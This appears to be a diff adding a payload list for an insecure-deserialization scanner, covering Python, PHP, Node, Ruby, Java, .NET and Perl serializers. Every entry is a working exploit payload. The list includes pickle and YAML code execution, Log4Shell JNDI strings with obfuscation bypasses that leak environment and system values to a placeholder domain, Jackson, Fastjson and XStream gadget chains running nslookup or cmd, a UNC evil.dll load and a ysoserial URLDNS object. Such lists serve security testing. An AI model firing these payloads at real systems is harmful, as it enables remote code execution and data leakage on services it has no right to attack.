+##Python Pickle P2 - Math (eval 7*191)##
+gAJjX19idWlsdGluX18KZXZhbApxAFgFAAAANyoxOTFxAYVxAlJxAy4=
+##Python Pickle P2 - Timing (sleep 5)##
+gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA1cQGFcQJScQMu
+##Python Pickle P2 - OOB urllib##
+gAJjX19idWlsdGluX18KZXZhbApxAFhHAAAAX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUyIilxAYVxAlJxAy4=
+##Python Pickle P2 - Error (1/0)##
+gAJjX19idWlsdGluX18KZXZhbApxAFgDAAAAMS8wcQGFcQJScQMu
+##Python Pickle P4 - Math (eval 7*191)##
+gASVIQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwFNyoxOTGUhZRSlC4=
+##Python Pickle P4 - Timing (sleep 5)##
+gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu
+##Python Pickle P4 - OOB urllib##
+gASVYwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxHX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGU0IimUhZRSlC4=
+##Python YAML - Math (eval 7*191)##
+!!python/object/apply:builtins.eval ["7*191"]
+##Python YAML - Math (subprocess echo 1337)##
+!!python/object/apply:subprocess.check_output [["echo","1337"]]
+##Python YAML - Timing (sleep 5)##
+!!python/object/apply:os.system ["sleep 5"]
+##Python YAML - OOB urllib##
+!!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml')"]
+##Python YAML - OOB DNS##
+!!python/object/apply:builtins.eval ["__import__('socket').getaddrinfo('{domain}',80)"]
+##Python YAML - Error (bad import)##
+!!python/object/apply:builtins.__import__ ['invalid_module_1337']
+##Python YAML - Error (1/0)##
+!!python/object/apply:builtins.eval ["1/0"]
+##Python YAML - OOB exec urllib##
+!!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml2')"]
+##Python jsonpickle - Math (eval 7*191)##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["7*191"]}]}
+##Python jsonpickle - Math (subprocess echo 1337)##
+{"py/reduce":[{"py/function":"subprocess.check_output"},{"py/tuple":[["echo","1337"]]}]}
+##Python jsonpickle - Timing (sleep 5)##
+{"py/reduce":[{"py/function":"time.sleep"},{"py/tuple":[5]}]}
+##Python jsonpickle - Error (1/0)##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["1/0"]}]}
+##Python jsonpickle - OOB urllib##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["__import__('urllib.request').request.urlopen('http://{domain}/jsonpickle')"]}]}
+##Python jsonpickle - OOB DNS##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["__import__('socket').getaddrinfo('{domain}',80)"]}]}
+##PHP Unserialize - Error (nonexistent class)##
+O:9999:"NonExist":0:{}
+##PHP Unserialize - Error (malformed)##
+O:1:"X":0:{
+##PHP Unserialize - Error (bad length)##
+O:8:"stdClass":99:{s:1:"x";s:1:"y";}
+##PHP Unserialize - Error (truncated)##
+O:8:"stdCl
+##PHP Unserialize - Error (nested invalid)##
+a:1:{i:0;O:23:"UndefinedClassName1337":0:{}}
+##PHP Unserialize - Laravel PendingBroadcast##
+O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"\0*\0events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"\0*\0listeners";a:1:{s:8:"shutdown";a:1:{i:0;s:6:"system";}}}s:8:"\0*\0event";s:21:"nslookup {domain}";}
+##PHP Unserialize - Symfony CacheAdapter##
+O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"\0Symfony\Component\Cache\Adapter\ProxyAdapter\0pool";O:44:"Symfony\Component\Cache\Adapter\ArrayAdapter":3:{s:54:"\0Symfony\Component\Cache\Adapter\ArrayAdapter\0values";a:0:{}s:60:"\0Symfony\Component\Cache\Adapter\ArrayAdapter\0expiration";a:0:{}s:21:"\0*\0createCacheItem";a:2:{i:0;O:15:"Faker\Generator":1:{s:13:"\0*\0formatters";a:1:{s:11:"fetchObject";s:6:"system";}}i:1;s:11:"fetchObject";}}s:58:"\0Symfony\Component\Cache\Adapter\ProxyAdapter\0setInner";s:9:"echo 1337";}
+##Node node-serialize - Math (return 7*191)##
+{"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}
+##Node node-serialize - Timing (sleep 5)##
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()"}
+##Node node-serialize - OOB http.get##
+{"rce":"_$$ND_FUNC$$_function(){require('http').get('http://{domain}/nodeser')}()"}
+##Node node-serialize - Math (eval 7*191)##
+{"rce":"_$$ND_FUNC$$_function(){return eval('7*191')}()"}
+##Node node-serialize - Error (throw)##
+{"rce":"_$$ND_FUNC$$_function(){throw new Error('1337')}()"}
+##Node js-yaml - Error (unknown tag)##
+!!invalid_tag_probe 1337
+##Node js-yaml - Error (bad regexp)##
+!!js/regexp /[invalid/
+##Node funcster - Error (invalid code)##
+{"__js":"throw new Error(1337)"}
+##Node cryo - Error (proto pollution)##
+{"__proto__":{"__cryo__":{"reduce":"_$$ND_FUNC$$_function(){throw new Error(1337)}()"}}}
+##Ruby YAML - Error (invalid class)##
+--- !ruby/object:NonExistentClass1337\ni: x
+##Ruby YAML - Error (Gem::Requirement chain)##
+--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\n  io: &1 !ruby/object:Net::BufferedIO\n    io: &1 !ruby/object:Gem::Package::TarReader::Entry\n       read: 0\n       header: "abc"\n    debug_output: &1 !ruby/object:Net::WriteAdapter\n       socket: &1 !ruby/object:Gem::RequestSet\n           sets: !ruby/object:Net::WriteAdapter\n               socket: !ruby/module 'Kernel'\n               method_id: :system\n           git_set: nslookup {domain}\n       method_id: :resolve
+##Ruby YAML - Error (ERB template)##
+--- !ruby/object:Gem::Requirement\nrequirements: !ruby/object:Gem::DependencyList\n  specs:\n  - !ruby/object:Gem::Source\n    current_fetch_uri: !ruby/object:URI::Generic\n      path: "| nslookup {domain}"
+##Ruby Marshal - Error (invalid class)##
+BAhvOh5Ob25FeGlzdGVudENsYXNzMTMzNwY6BmlJIgZ4BjoGRVQ=
+##Ruby Marshal - Error (ERB template)##
+BAhvOghFUkIHOglAc3JjSSIfPCU9IGBuc2xvb2t1cCB7ZG9tYWlufWAgJT4GOgZFVDoOQGZpbGVuYW1lSSILKGVyYikGOgZFVA==
+##Ruby Marshal - Error (malformed)##
+BAj/AAAA
+##Ruby Marshal - Error (truncated)##
+BAhvOjBBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE=
+##Java JNDI - OOB iiop##
+${jndi:iiop://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 1##
+${${lower:j}ndi:${lower:l}dap://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 2##
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 3##
+${j${::-n}di:ldap://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 4##
+${jn${lower:d}i:ldap://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 5##
+${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{domain}/a}
+##Java JNDI - OOB env leak##
+${jndi:ldap://{domain}/${env:USER}}
+##Java JNDI - OOB java version leak##
+${jndi:ldap://{domain}/${java:version}}
+##Java JNDI - OOB sys property leak##
+${jndi:ldap://{domain}/${sys:user.dir}}
+##Java Jackson - Error (JdbcRowSetImpl LDAP)##
+["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://{domain}/a","autoCommit":true}]
+##Java Jackson - Error (JdbcRowSetImpl RMI)##
+["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"rmi://{domain}/a","autoCommit":true}]
+##Java Jackson - Error (ClassPathXml)##
+["org.springframework.context.support.ClassPathXmlApplicationContext","http://{domain}/evil.xml"]
+##Java Jackson - Error (TemplatesImpl)##
+["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":["yv66vg=="],"transletName":"a","outputProperties":{}}]
+##Java Jackson - Error (InetAddress DNS)##
+["java.net.InetSocketAddress",{"address":"","port":80,"hostName":"{domain}"}]
+##Java Jackson - Error (C3P0)##
+["com.mchange.v2.c3p0.JndiRefForwardingDataSource",{"jndiName":"ldap://{domain}/a","loginTimeout":0}]
+##Java Jackson - Error (@type JdbcRowSetImpl)##
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{domain}/a","autoCommit":true}
+##Java Jackson - Error (TemplatesImpl @class)##
+{"@class":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","transletBytecodes":["yv66vg=="],"transletName":"a","outputProperties":{}}
+##Java Jackson - Error (XBean JndiConverter)##
+["org.apache.xbean.propertyeditor.JndiConverter",{"asText":"ldap://{domain}/a"}]
+##Java Jackson - Error (Logback)##
+["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://{domain}/a"}]
+##Java Jackson - Error (Spring)##
+["org.springframework.context.support.ClassPathXmlApplicationContext","http://{domain}/jackson.xml"]
+##Java Fastjson - Error (TemplatesImpl)##
+{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vg=="],"_name":"a","_tfactory":{},"_outputProperties":{}}
+##Java Fastjson - OOB (InetAddress DNS)##
+{"@type":"java.net.InetAddress","val":"{domain}"}
+##Java Fastjson - OOB (Inet4Address)##
+{"@type":"java.net.Inet4Address","val":"{domain}"}
+##Java Fastjson - Error (L prefix bypass)##
+{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://{domain}/a","autoCommit":true}
+##Java Fastjson - Error (LL bypass)##
+{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://{domain}/a","autoCommit":true}
+##Java Fastjson - Error (1.2.47 cache bypass)##
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{domain}/a","autoCommit":true}}
+##Java XStream - Error (ProcessBuilder)##
+<java.lang.ProcessBuilder><command><string>nslookup</string><string>{domain}</string></command></java.lang.ProcessBuilder>
+##Java XStream - Error (EventHandler)##
+<sorted-set><string>foo</string><dynamic-proxy><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>nslookup</string><string>{domain}</string></command></target><action>start</action></handler></dynamic-proxy></sorted-set>
+##Java XStream - Error (Runtime exec)##
+<object class="java.lang.Runtime" method="getRuntime"><void method="exec"><string>nslookup {domain}</string></void></object>
+##Java XStream - Error (ImageIO/NativeString)##
+<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><contentType>text/plain</contentType><is class="java.io.SequenceInputStream"><e class="javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator"><iterator class="javax.imageio.spi.FilterIterator"><iter class="java.util.ArrayList$Itr"><cursor>0</cursor><lastRet>-1</lastRet><expectedModCount>1</expectedModCount></iter><next class="java.lang.ProcessBuilder"><command><string>nslookup</string><string>{domain}</string></command></next></iterator></e></is></dataSource></dataHandler></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry></map>
+##Java XStream - Error (Spring JNDI)##
+<org.springframework.beans.factory.config.PropertyPathFactoryBean><targetBeanName>ldap://{domain}/a</targetBeanName><propertyPath>a</propertyPath><beanFactory class="org.springframework.jndi.support.SimpleJndiBeanFactory"><shareableResources><string>ldap://{domain}/a</string></shareableResources></beanFactory></org.springframework.beans.factory.config.PropertyPathFactoryBean>
+##SnakeYAML - Error (URLClassLoader OOB)##
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://{domain}/snakeyaml"]]]]
+##SnakeYAML - Error (JdbcRowSetImpl JNDI)##
+!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "ldap://{domain}/a", autoCommit: true}
+##SnakeYAML - Error (nonexistent class)##
+!!com.nonexistent.FakeClass1337 {}
+##SnakeYAML - Error (C3P0)##
+!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource {userOverridesAsString: "HexAsciiSerializedMap:aced...;", jndiName: "ldap://{domain}/a"}
+##XMLDecoder - Math (echo 1337)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>echo 1337</string></void></array><void method="start"/></object></java>
+##XMLDecoder - Timing (sleep 5)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>
+##XMLDecoder - OOB URL.openStream##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.net.URL"><string>http://{domain}/xmldecoder</string><void method="openStream"/></object></java>
+##XMLDecoder - Error (invalid class)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="com.nonexistent.Fake1337"/></java>
+##Java Serialized - Error (HashSet header)##
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==
+##Java Serialized - Error (String array)##
+rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAJ0AAxuc2xvb2t1cCB0ZXN0dAAEdGVzdA==
+##ysoserial URLDNS - OOB (DNS lookup)##
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHA/QAAAAAAADHcIAAAAEAAAAAFzcgAMamF2YS5uZXQuVVJMliU3Nhr85HIDAAdJAAhoYXNoQ29kZUkABHBvcnRMAAlhdXRob3JpdHl0ABJMamF2YS9sYW5nL1N0cmluZztMAARmaWxldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEaG9zdHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHByb3RvY29sdAASTGphdmEvbGFuZy9TdHJpbmc7TAADcmVmdAASTGphdmEvbGFuZy9TdHJpbmc7cP//////////dAAIe2RvbWFpbn10AAcvdXJsZG5zdAAIe2RvbWFpbn10AARodHRwcHh0ABZodHRwOi8ve2RvbWFpbn0vdXJsZG5zeA==
+##Java Hessian - OOB (JNDI ref)##
+C_hessianRldap://{domain}/a
+##.NET Json.NET - OOB (nslookup)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"nslookup","Arguments":"{domain}"}}}
+##.NET Json.NET - Math (echo 1337)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
+##.NET Json.NET - Timing (timeout 5)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c timeout 5"}}}
+##.NET Json.NET - OOB (AssemblyInstaller UNC)##
+{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"\\\\{domain}\\share\\evil.dll"}
+##.NET XmlSerializer - OOB (nslookup)##
+<root type="System.Windows.Data.ObjectDataProvider, PresentationFramework"><ObjectInstance type="System.Diagnostics.Process, System"><StartInfo><FileName>nslookup</FileName><Arguments>{domain}</Arguments></StartInfo></ObjectInstance><MethodName>Start</MethodName></root>
+##.NET BinaryFormatter - Error (header probe)##
+AAEAAAD/////AQAAAAAAAAAEAQAAAA==
+##.NET BinaryFormatter - Error (TypeConfuseDelegate)##
+AAEAAAD/////AQAAAAAAAAAEAQAAAD1TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Tb3J0ZWRTZXRgMVtbU3lzdGVtLlN0cmluZw==
+##.NET SoapFormatter - OOB (nslookup)##
+<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><a1:ObjectDataProvider xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Windows.Data/PresentationFramework"><MethodName>Start</MethodName><ObjectInstance xsi:type="a2:Process" xmlns:a2="http://schemas.microsoft.com/clr/nsassem/System.Diagnostics/System"><StartInfo><FileName>nslookup</FileName><Arguments>{domain}</Arguments></StartInfo></ObjectInstance></a1:ObjectDataProvider></SOAP-ENV:Body></SOAP-ENV:Envelope>
+##.NET ViewState - Error (probe)##
+__VIEWSTATE=/wEPDwUKLTEyMzQ1Njc4OQ==
+##.NET ViewState - Error (generator)##
+__VIEWSTATEGENERATOR=CA0B0334
+##.NET JavaScriptSerializer - Error (ObjectDataProvider)##
+{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
+##.NET LosFormatter - Error (truncated)##
+/wEAAQAAAP////8BAAAAAAAAAA==
+##.NET ObjectStateFormatter - Error (probe)##
+AAEAAAD/////AQAAAAAAAAAMAQAAABVTeXN0ZW0uV2luZG93cy5Gb3Jtcw==
+##Perl Storable - Error (malformed nfreeze)##
+cHN0MAUKBAAAAAAAAAAA
+##Perl Storable - Error (bad version)##
+cHN0MP///wQA
+##Perl Storable - Error (large length DoS)##
+cHN0MAUKBAP/////
+##Perl YAML - Error (invalid syntax)##
+--- {{{invalid yaml 1337
+##Perl YAML - Error (!!perl/regexp eval)##
+--- !!perl/regexp (?{system("echo 1337")})
+##Perl YAML - Error (!!perl/regexp nested eval)##
+--- !!perl/regexp (?{eval("die 1337")})
